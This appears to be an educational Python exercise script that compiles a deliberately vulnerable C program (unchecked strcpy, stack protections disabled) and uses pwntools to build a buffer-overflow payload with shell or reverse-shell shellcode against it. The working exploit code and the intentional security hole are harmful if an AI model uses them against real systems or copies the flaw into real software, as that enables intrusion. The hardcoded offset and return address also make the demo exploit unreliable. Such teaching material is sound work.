#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Basic Buffer Overflow Task - Educational pf Task

This task demonstrates a basic buffer overflow exploitation using pwntools,
with step-by-step educational content for beginners.
"""

import sys
import os

# Add the MSF Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'lib', 'msf', 'core', 'modules', 'external', 'python'))

from metasploit.pf_task import (
    TaskMetadata, TaskCategory, SkillLevel, 
    run_pf_task, setup_pwntools_context, create_educational_content
)

# Task metadata
task_metadata = TaskMetadata(
    name="Basic Buffer Overflow Exploitation",
    description="""
    Learn the fundamentals of buffer overflow exploitation using pwntools.
    This task walks through identifying vulnerabilities, crafting payloads,
    and gaining control of program execution.
    """,
    authors=["pf Team"],
    category=TaskCategory.EDUCATION,
    skill_level=SkillLevel.BEGINNER,
    date="2024-01-15",
    tools_required=["pwntools", "gdb"],
    educational_objectives=[
        "Understand buffer overflow vulnerabilities",
        "Learn to craft basic exploits with pwntools", 
        "Practice payload development",
        "Understand return address overwriting"
    ],
    prerequisites=[
        "Basic understanding of C programming",
        "Familiarity with assembly language concepts",
        "Understanding of program memory layout"
    ],
    estimated_time="15-20 minutes",
    difficulty_rating=2,
    options={
        'target_binary': {
            'type': 'string', 
            'description': 'Path to vulnerable binary',
            'required': True,
            'default': '/tmp/vuln_binary'
        },
        'target_host': {
            'type': 'address',
            'description': 'Target host (for remote exploitation)',
            'required': False,
            'default': 'localhost'
        },
        'target_port': {
            'type': 'port',
            'description': 'Target port (for remote exploitation)',
            'required': False,
            'default': 9999
        },
        'payload_type': {
            'type': 'enum',
            'description': 'Type of payload to use',
            'required': False,
            'default': 'shell',
            'values': ['shell', 'reverse_shell', 'bind_shell']
        }
    },
    env_vars={
        'PF_DEBUG': 'false',
        'PF_VERBOSE': 'true'
    }
)

def provide_education(args):
    """Provide educational content for this task"""
    
    concepts = [
        "Buffer overflows occur when data exceeds allocated buffer space",
        "Stack-based overflows can overwrite return addresses",
        "pwntools provides utilities for exploit development",
        "Payload crafting requires understanding target architecture"
    ]
    
    steps = [
        "Analyze the target binary for vulnerabilities",
        "Determine the offset to overwrite return address",
        "Craft a payload using pwntools",
        "Test the exploit locally",
        "Adapt for remote exploitation if needed"
    ]
    
    return create_educational_content(
        task_metadata.educational_objectives,
        concepts,
        steps
    )

def main_task(args, tools):
    """Main task execution function"""
    
    # Import pwntools (available through tools integration)
    try:
        from pwn import *
    except ImportError:
        log.error("pwntools not available - please install with: pip install pwntools")
        return False
    
    target_binary = args.get('target_binary')
    target_host = args.get('target_host', 'localhost')
    target_port = int(args.get('target_port', 9999))
    payload_type = args.get('payload_type', 'shell')
    
    log.info(f"Starting buffer overflow task on {target_binary}")
    
    # Step 1: Analyze the binary
    log.info("Step 1: Analyzing target binary...")
    
    if not os.path.exists(target_binary):
        log.error(f"Target binary not found: {target_binary}")
        log.info("Creating a simple vulnerable binary for demonstration...")
        
        # Create a simple vulnerable C program for demonstration
        vuln_code = '''
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Vulnerable strcpy
    printf("Input received: %s\\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
'''
        
        # Write and compile the vulnerable program
        vuln_c_path = '/tmp/vuln.c'
        with open(vuln_c_path, 'w') as f:
            f.write(vuln_code)
            
        compile_cmd = f"gcc -fno-stack-protector -z execstack -no-pie {vuln_c_path} -o {target_binary}"
        log.info(f"Compiling vulnerable binary: {compile_cmd}")
        
        if os.system(compile_cmd) != 0:
            log.error("Failed to compile vulnerable binary")
            return False
            
        log.success(f"Created vulnerable binary at {target_binary}")
    
    # Step 2: Set up pwntools context
    log.info("Step 2: Setting up pwntools context...")
    
    # Analyze binary with pwntools
    try:
        elf = ELF(target_binary)
        log.info(f"Binary architecture: {elf.arch}")
        log.info(f"Binary bits: {elf.bits}")
        
        # Set context
        context.binary = elf
        context.log_level = 'debug' if args.get('debug') else 'info'
        
    except Exception as e:
        log.error(f"Failed to analyze binary: {e}")
        return False
    
    # Step 3: Find buffer overflow offset
    log.info("Step 3: Finding buffer overflow offset...")
    
    # Use cyclic pattern to find offset
    try:
        # Create a cyclic pattern
        pattern_length = 200
        pattern = cyclic(pattern_length)
        
        log.info(f"Generated cyclic pattern of length {pattern_length}")
        
        # For demonstration, we'll assume offset of 72 for our simple binary
        # In a real scenario, you'd run this with GDB to find the exact offset
        offset = 72
        log.info(f"Using offset: {offset} (in real scenario, determine with GDB)")
        
    except Exception as e:
        log.error(f"Failed to generate pattern: {e}")
        return False
    
    # Step 4: Craft payload
    log.info("Step 4: Crafting payload...")
    
    try:
        if payload_type == 'shell':
            # Simple shellcode payload
            shellcode = asm(shellcraft.sh())
            log.info(f"Generated shellcode ({len(shellcode)} bytes)")
            
            # Build payload: padding + return address + shellcode
            payload = b'A' * offset
            payload += p64(elf.symbols.get('main', elf.entry))  # Return to main for demo
            payload += shellcode
            
        elif payload_type == 'reverse_shell':
            # Reverse shell payload
            shellcode = asm(shellcraft.connect(target_host, target_port) + shellcraft.sh())
            payload = b'A' * offset + p64(elf.entry) + shellcode
            
        else:
            log.error(f"Unsupported payload type: {payload_type}")
            return False
            
        log.info(f"Crafted payload ({len(payload)} bytes)")
        
    except Exception as e:
        log.error(f"Failed to craft payload: {e}")
        return False
    
    # Step 5: Test exploit
    log.info("Step 5: Testing exploit...")
    
    try:
        # Test locally first
        log.info("Testing exploit locally...")
        
        # Create process
        p = process([target_binary, payload])
        
        # Send payload and interact
        log.info("Payload sent, checking for shell...")
        
        # For demonstration, just check if process is running
        if p.poll() is None:
            log.success("Process is running - exploit may have succeeded!")
            log.info("In a real scenario, you would interact with the shell here")
            p.close()
        else:
            log.warning("Process exited - exploit may have failed")
            
    except Exception as e:
        log.error(f"Exploit test failed: {e}")
        return False
    
    # Step 6: Summary and next steps
    log.info("Step 6: Task summary...")
    
    log.success("Buffer overflow task completed!")
    log.info("What you learned:")
    log.info("  • How to analyze binaries with pwntools")
    log.info("  • Buffer overflow offset calculation")
    log.info("  • Payload crafting techniques")
    log.info("  • Basic exploit testing")
    
    log.info("Next steps for learning:")
    log.info("  • Practice with different binary protections")
    log.info("  • Learn ROP (Return Oriented Programming)")
    log.info("  • Explore heap-based vulnerabilities")
    log.info("  • Study modern exploit mitigations")
    
    return True

if __name__ == '__main__':
    run_pf_task(task_metadata, main_task, provide_education)